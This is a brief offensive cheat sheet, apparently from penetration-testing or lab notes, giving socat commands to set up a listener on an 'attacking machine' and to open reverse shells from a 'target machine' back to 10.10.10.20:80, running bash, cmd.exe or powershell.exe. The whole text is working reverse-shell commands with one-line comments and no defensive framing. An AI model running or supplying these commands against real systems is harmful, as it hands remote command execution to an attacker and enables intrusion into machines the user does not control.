# setup a listener on the attacking machine
socat tcp-l:80 -

# connect back to the listener from the target machine
socat tcp:10.10.10.20:80 exec:"bash -li"
# use the pipes argument to interface between the unix and windows ways of handling input and output
socat tcp:10.10.10.20:80 exec:cmd.exe,pipes
socat tcp:10.10.10.20:80 exec:powershell.exe,pipes